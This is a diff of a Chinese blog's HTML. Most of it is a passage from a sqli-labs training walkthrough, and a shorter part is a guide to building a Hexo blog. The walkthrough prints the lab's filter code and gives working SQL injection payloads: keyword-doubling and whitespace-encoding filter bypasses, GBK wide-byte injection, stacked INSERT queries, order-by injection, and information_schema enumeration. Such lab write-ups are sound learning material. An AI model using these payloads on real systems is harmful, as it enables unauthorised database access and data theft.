class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="less-27（过滤了但是大小写敏感）"><a href="#less-27（过滤了但是大小写敏感）" class="headerlink" title="less-27（过滤了但是大小写敏感）"></a>less-27（过滤了但是大小写敏感）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这正则表达式区分大小写，可以改变几个字母的大小写来绕过，如果不改的话，select过滤了两次，要多加一个select</p>
 <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="symbol">&#x27;uunionnion</span>(ssselectelectelect(<span class="number">1</span>),group_concat(column_name),(<span class="number">3</span>)from(information_schema.columns)<span class="keyword">where</span>(table_schema=<span class="symbol">&#x27;security</span>&#x27;)and(table_name=<span class="string">&#x27;users&#x27;</span>));%<span class="number">00</span></span><br></pre></td></tr></table></figure>
@@ -766,12 +1043,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
 
 <p>\s 表示空白，\s+ 表示 一个或一个以上的空白</p>
-<p>\**\ 不是空白</p>
+<p>/**/ 不是空白</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>&#x27;)<span class="variable">%09</span>union/**/<span class="keyword">select</span><span class="variable">%0</span>b<span class="number">1</span><span class="punctuation">,</span>group_concat(column_name)<span class="punctuation">,</span><span class="number">3</span><span class="variable">%0</span>cfrom<span class="variable">%0</span>dinformation_schema.columns<span class="variable">%09</span>where<span class="variable">%09</span>table_schema<span class="operator">=</span>&#x27;security&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>table_name<span class="operator">=</span>&#x27;users&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>(&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h1><p>index.php 中没有过滤，和 less-1 差不多吧</p>
+<h1 id="less-29-SERVER和-GET交叉使用，HTTP-Parameter-Pollution以及逻辑漏洞"><a href="#less-29-SERVER和-GET交叉使用，HTTP-Parameter-Pollution以及逻辑漏洞" class="headerlink" title="less-29($_SERVER和$_GET交叉使用，HTTP Parameter Pollution以及逻辑漏洞)"></a>less-29($_SERVER和$_GET交叉使用，HTTP Parameter Pollution以及逻辑漏洞)</h1><p>index.php 中没有过滤，和 less-1 差不多吧</p>
 <p>login.php 中白名单过滤，但他这个感觉是有点问题</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);  <span class="comment">// 根据 &amp; 分割查询字符串</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];  <span class="comment">// 检查的和使用的字符串并不完全相同</span></span><br><span class="line">whitelist(<span class="variable">$id1</span>);  <span class="comment">// 检查分割后的是否为纯数字</span></span><br></pre></td></tr></table></figure>
 
@@ -813,7 +1090,7 @@
 
 
 
-<h1 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h1><p>宽字符/宽字节注入</p>
+<h1 id="less-32（宽字符-宽字节注入）"><a href="#less-32（宽字符-宽字节注入）" class="headerlink" title="less-32（宽字符/宽字节注入）"></a>less-32（宽字符/宽字节注入）</h1><p>宽字符/宽字节注入，原理可以参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
 <p>好像要求字符集为 GBK，有没有其他要求不知道</p>
 <p>猜一下原因，反斜杠 ASCII 码值为 5C（gbk、utf8这些变长编码都兼容ASCII码，所以反斜杠还是 5C），而非最高位的字节为 5C 在gbk中是存在合法的码的。像utf8，多字节的码每个字节的最高位都是 1（5c = 0101 1100），不存在合法的码。gb2312中好像也不行</p>
 <p>这关转义了 <code>&#39; &quot; \</code> 就在这些字符前面加反斜杠。如果我们传入id参数时在 单引号 前面加上 <code>%df</code> ，别的值也行，但是要超过 ASCII 码表示的范围（0x00 - 0x7f，%80好像也不行，不行就多试几个），<code>\xdf&#39;</code> 转义后为<code>\xdf\x5c&#39;</code> 字符集为 GBK 时，0xdf 不在单字节字符（0x00 - 0x7f）的范围内，所以 0xdf 被 mysql 认为是 多字节字符（GBK好像最多就两字节表示一个字符）的第一个字节，而 0x5c 被认为是第二个字节而不是反斜杠，单引号就逃逸了。</p>
@@ -887,7 +1164,7 @@
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password: &#x27;) or 1=1;<span class="keyword">insert</span> <span class="keyword">into</span> users(username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;stacked3&#x27;</span>,<span class="string">&#x27;asd&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>要是在浏览器中不知道自己password有没有输错，可以把这个input 标签的 type 从 password 改成 text，在 F12 中修改，或者 右键 -&gt; 检查（谷歌浏览器是检查，其他浏览器可能叫法不一样）快速找到这个元素</p>
-<h1 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h1><p>一开始看和 42 一样，说是盲注结果还有回显点</p>
+<h1 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h1><p>一开始看和 42 一样，说是盲注，结果还有回显点</p>
 <p>vscode 左右拆分比较代码，发现这关没有报错信息</p>
 <p>emm。。。</p>
 <p>或许该去找一个比较代码差异的工具</p>
@@ -897,7 +1174,7 @@
 
 
 
-<h1 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h1><p>拼接sql语句的位置在 order by 后面</p>
+<h1 id="less-46（order-by）"><a href="#less-46（order-by）" class="headerlink" title="less-46（order by）"></a>less-46（order by）</h1><p>拼接sql语句的位置在 order by 后面</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>有本书把这种情况称为 注入点在 order by 后</p>
@@ -917,7 +1194,7 @@
 
 
 
-<h1 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h1><p>sort 参数的值被单引号包裹</p>
+<h1 id="less-47（order-by，单引号包裹）"><a href="#less-47（order-by，单引号包裹）" class="headerlink" title="less-47（order by，单引号包裹）"></a>less-47（order by，单引号包裹）</h1><p>sort 参数的值被单引号包裹</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>再用mysql 试一下</p>
@@ -971,13 +1248,13 @@
 
 <h1 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h1><p>报错信息删了</p>
 <h1 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h1><p>多个单引号</p>
-<h1 id="less-54-（challenge）"><a href="#less-54-（challenge）" class="headerlink" title="less-54 （challenge）"></a>less-54 （challenge）</h1><p>描述</p>
+<h1 id="less-54-（challenge，常规sql注入流程）"><a href="#less-54-（challenge，常规sql注入流程）" class="headerlink" title="less-54 （challenge，常规sql注入流程）"></a>less-54 （challenge，常规sql注入流程）</h1><p>描述</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The objective <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> dump the (secret key) <span class="keyword">from</span> <span class="keyword">only</span> random <span class="keyword">table</span> <span class="keyword">from</span> <span class="keyword">Database</span> (<span class="string">&#x27;CHALLENGES&#x27;</span>) <span class="keyword">in</span> Less than <span class="number">10</span> attempts</span><br><span class="line"><span class="keyword">For</span> fun, <span class="keyword">with</span> every <span class="keyword">reset</span>, the challenge spawns random <span class="keyword">table</span> <span class="type">name</span>, <span class="keyword">column</span> <span class="type">name</span>, <span class="keyword">table</span> data. Keeping it fresh at <span class="keyword">all</span> times.</span><br></pre></td></tr></table></figure>
 
 <p>大致意思是表名随机，而且查询一定次数会重新生成表名</p>
 <p>只有表名会变，所以试列数回显点什么的多试几次也没什么问题，数据库名字也给了</p>
 <p>sqlmap不知道会不会直接寄</p>
-<p>测试是否存在注入（// 后面为注释，解释这一步的目的）</p>
+<p>测试是否存在注入（// 后面为注释，解释这一步的目的），可以直接猜，少试几个，比如一些字段不太可能是纯数字，那数字型的测试就可以跳过</p>
 <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>  //<span class="built_in"> id</span>=<span class="number">1</span>是存在的，如果不知<span class="built_in">道id</span>为何值时是存在的，可以试试可能存在的值或者直接尝试整型或字符型注入</span><br><span class="line"></span><br><span class="line">// 根<span class="built_in">据id</span>来查找数据（增删改查中的查）</span><br><span class="line">// 可以先假设一下sql语句，如 select * from a_table <span class="keyword">where</span><span class="built_in"> id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] limit <span class="number">0</span>,<span class="number">1</span>; 猜测一下程序把我们传进去的参数拼接在了什么位置（只是个大概，不一定准确）</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">2</span>  //<span class="built_in"> id</span>=<span class="number">2</span>也是存在的，也可以不要这一步，看<span class="built_in"> id</span>=<span class="number">2</span>-<span class="number">1</span> 结果和<span class="built_in"> id</span>=<span class="number">1</span> 相不相同</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">2</span>-<span class="number">1</span>  // 此时页面和<span class="built_in"> id</span>=<span class="number">2</span> 时相同，基于 mysql 中字符串和整型比较时的结果，我们可以知道 <span class="number">2</span>-<span class="number">1</span> 很大可能被作为字符串拼接在 sql 语句中（引号包裹），也不排除数据库<span class="built_in">里id</span>为字符型，刚好有一条记<span class="built_in">录id</span>是 <span class="string">&#x27;2-1&#x27;</span> ，可以多试几个</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=-<span class="number">1</span>  // 用于判断是否有mysql的报错信息，要结合后面的</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  // 判断单引号还是双引号包裹，页面没有显示信息，可能就是单引号包裹并且没有报错信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&quot;  // 与id=1页面相同，结合之前的，大概率是单引号包裹的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 以上只能初步判断，搞不好就有那种特别离谱的数据库，但都到这了，不妨接着试一试</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>--+  // 有信息，之后可以用二分法判断查询了多少列，<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>没问题，<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>有问题，所以 <span class="number">3</span> 的时候sql语句正常，而 <span class="number">4</span> 不正常，所以只查询了 <span class="number">3</span> 列</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">id</span>=<span class="string">&#x27;union select 1,2,3--+  // 知道了查询三列，就可以试试联合查询，注意 单引号前面的 1 不要了，不然如果网页只能回显一行，我们的1，2，3就显示不出来了。观察网页，我们发现有2，3这两个回显点，而且这时候我们能够确定真的存在sql注入</span></span><br></pre></td></tr></table></figure>
 
 <p>注入点和回显点都确定了，数据库名也知道了，直接查有哪些表，列</p>
@@ -987,7 +1264,7 @@
 <h1 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h1><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">error </span>in function next_tryy()You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;7e8cvw0olr SET tryy=tryy<span class="string">+1</span> WHERE id=1&#x27; at line 1</span><br></pre></td></tr></table></figure>
 
 <p>人麻了，最恐怖的是我试了一下 less-54 也这样了</p>
-<p>可能是 7e8cvw0olr 和什么mysql中的关键字冲突了</p>
+<p><del>可能是 7e8cvw0olr 和什么mysql中的关键字冲突了</del> 后来感觉像是 7e8 被当成了科学计数法</p>
 <p>修改一下sql-connections/functions.php，79行，next_tryy函数中</p>
 <figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;UPDATE $table SET tryy=tryy+1 WHERE id=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">=&gt;$sql = <span class="string">&quot;UPDATE `$table` SET tryy=tryy+1 WHERE id=1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
@@ -1093,7 +1370,7 @@
 
 <p> sqli-labs在github上面的最后更新时间还是 2014 年。现在 php7 中删去了 mysql_ 开头的函数，可以用mysqli_ 开头的函数替代（如果想用 php7 而不是php5 的话），github上面好像有人改成了php7可以使用的版本（不止一个）。网上还有教在linux下用shell脚本把源码中的 mysql_ 全部替换成 mysqli_ 的，据说也可以</p>
 <p>但我用phpstudy 可以切换php的版本（感觉这样比较灵活）</p>
-<p>盲注脚本以后再补</p>
+<p>盲注脚本以后再补（有机会的话）</p>
 
       
     </div>
@@ -1136,10 +1413,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-14 20:22:24 / 修改时间：23:56:31" itemprop="dateCreated datePublished" datetime="2022-01-14T20:22:24+08:00">2022-01-14</time>
+              <time title="创建时间：2022-01-14 20:22:24" itemprop="dateCreated datePublished" datetime="2022-01-14T20:22:24+08:00">2022-01-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-22 23:41:32" itemprop="dateModified" datetime="2022-04-22T23:41:32+08:00">2022-04-22</time>
+              </span>
 
           
 
@@ -1158,29 +1441,29 @@
 <p>使用 git bash 可以在 windows 上使用 linux 的命令</p>
 <p>在<a target="_blank" rel="noopener" href="https://nodejs.org/en/">node.js官网</a>下载安装包，下载速度还行，安装时使用默认配置</p>
 <p>使用 <code>node -v</code> 查看node.js版本，使用<code>npm -v</code> 查看npm（Node Package Manager）版本，验证是否安装成功</p>
-<p><img src="/images/1.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/1.png"></p>
 <h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>国外的源一般都比较慢，所以先给npm换源（淘宝源）</p>
 <p><code>npm config set registry https://registry.npm.taobao.org</code></p>
 <p>另一种换源方法是使用cnpm</p>
 <p><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
 <p>我选择直接换源</p>
 <p>使用<code>npm config get registry</code> 可以查看当前使用的源</p>
-<p><img src="/images/2.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/2.png"></p>
 <p>接下来就可以安装hexo了，-g表示全局安装</p>
 <p><code>npm install -g hexo-cli</code></p>
 <p>全局安装，网上的说法</p>
 <p><code>如果你想将其作为一个命令行工具，那么你应该将其安装到全局。这种安装方式后可以让你在任何目录下使用这个包。</code></p>
 <p>新建一个文件夹，如<code>blog</code> ，将当前工作目录切换为刚创建的文件夹，输入<code>hexo init</code> 初始化，初始化时会从github上下载一些东西，初始化后文件夹内容如下，其中 _config.yml 是一个比较重要的配置文件</p>
-<p><img src="/images/3.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/3.png"></p>
 <p>使用 <code>hexo new &quot;使用hexo搭建博客&quot;</code> 会在 ./source/_posts/ 下新建一个markdown文件</p>
-<p><img src="/images/4.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/4.png"></p>
 <p>hello-world.md 是初始化后自动生成的，TEST-MTYSQL.md 是我之前创建的</p>
 <p>编辑相应的 markdown 文件（Typora，vscode，Mark Text，用的不多，不知道哪个比较好用）</p>
 <p>切回之前的目录，重新生成静态文件</p>
 <figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure>
 
 <p>在本地预览，ctrl+c 终止进程<br><code>hexo server</code></p>
-<p><img src="/images/5.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/5.png"></p>
 <p>hexo的一些命令可以简写，有点像gdb</p>
 <figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">hexo</span> server -&gt;</span> hexo s</span><br><span class="line"><span class="function"><span class="title">hexo</span> generate -&gt;</span> hexo g</span><br><span class="line"><span class="function"><span class="title">hexo</span> deploy -&gt;</span> hexo d  # 部署，之后会用到</span><br></pre></td></tr></table></figure>
 
@@ -1196,7 +1479,7 @@
 
 
 <p>修改 _config.yml，repo是github项目的地址，新建项目时会给出，可以使用https或ssh，此处使用ssh（可以实现免密登录）</p>
-<p><img src="/images/6.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/6.png"></p>
 <p>github中有生成ssh密钥的教程，在git bash中输入如下命令，-C 后面的类似注释，会出现几个选项，直接回车就行</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span>-keygen -t rsa -b <span class="number">4096</span> -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure>
 
@@ -1207,23 +1490,32 @@
 <p>可以测试ssh连接github，连上了会提示成功</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T <span class="symbol">git@</span>github.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/7.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/7.png"></p>
 <p>生成静态文件后，使用 <code>hexo deploy</code> 即可完成部署</p>
 <h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>我选择了next主题，先将仓库克隆到本地，放在 ./themes/next 目录下</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>hexo-theme-<span class="keyword">next</span> themes/<span class="keyword">next</span></span><br></pre></td></tr></table></figure>
 
 <p>在 ./_config.yml 中，修改theme 为 next</p>
-<p><img src="/images/8.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/8.png"></p>
 <p>这个时候已经换好主题了，但还可以做一些别的修改，比如将 ./_config.yml 中的标题、副标题、描述、作者、语言时区等等，改为想要的</p>
 <p>在 ./themes/next/_config.yml 中可以修改一些样式，如头像，next主题提供了四种sheme，也在这修改</p>
-<p><img src="/images/9.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/9.png"></p>
 <p>头像是avatar ，url 是 相对 ./themes/next/source/ 的路径，把文件放到相应目录即可，rounded为true表示头像是圆的，rotated为true表示鼠标放在头像上头像会旋转</p>
-<p><img src="/images/10.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/10.png"></p>
 <p>生成静态文件后重新部署即可更换主题</p>
 <h1 id="文章中插入图片"><a href="#文章中插入图片" class="headerlink" title="文章中插入图片"></a>文章中插入图片</h1><p>网上一查，三四篇一样的，没怎么看懂，以后再研究那种方法。从b站学了一手，在 ./source/ 目录下新建一个 images 目录，然后将图片放在这里面</p>
-<p><img src="/images/11.png"></p>
-<p>写 markdown 的时候如下，无法预览图片，只能在部署后查看（images前面不加 / 好像会出点问题）</p>
-<p><img src="/images/12.png"></p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/11.png"></p>
+<p>写 markdown 的时候如下，无法预览图片，只能在部署后查看（images前面不加 / 好像会出点问题）。不加/就是相对路径，部署后如果访问的不是网站根目录就无法找到图片文件</p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/12.png"></p>
+<h2 id="2022-4-23-关于typora中图片路径设置（version-0-11-13）"><a href="#2022-4-23-关于typora中图片路径设置（version-0-11-13）" class="headerlink" title="2022.4.23 关于typora中图片路径设置（version 0.11.13）"></a>2022.4.23 关于typora中图片路径设置（version 0.11.13）</h2><p>格式-&gt;图像-&gt;设置图片根目录，设置为source目录，也就是上一级目录（假设md文件在_post目录下）</p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20220422230420087.png" alt="image-20220422230420087"></p>
+<p>开头会多出来一行</p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20220422230704910.png" alt="image-20220422230704910"></p>
+<p>这样就已经可以在typora中正常查看图片了，md文件中使用绝对路径的话，部署到github上也能正常访问</p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20220422231226567.png" alt="image-20220422231226567"></p>
+<p>文件-&gt;偏好设置中，设置如下。插入图片时就会复制到指定路径 <code>$&#123;filename&#125;</code> 表示当前文件名（不包括扩展名）</p>
+<p><img src="/images/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20220422230815953.png" alt="image-20220422230815953"></p>
+<p>这样直接把图片粘贴进来就会自动保存到相应路径，而且markdown文件中的图片路径也是绝对路径，部署到github上也没问题，不过每次打开md文件好像都得重新设置一次图片根目录</p>
 
       
     </div>
@@ -1320,76 +1612,6 @@
 </ul>
 </li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/14/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Yuumi.jpg">
-      <meta itemprop="name" content="x4297">
-      <meta itemprop="description" content="开摆!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
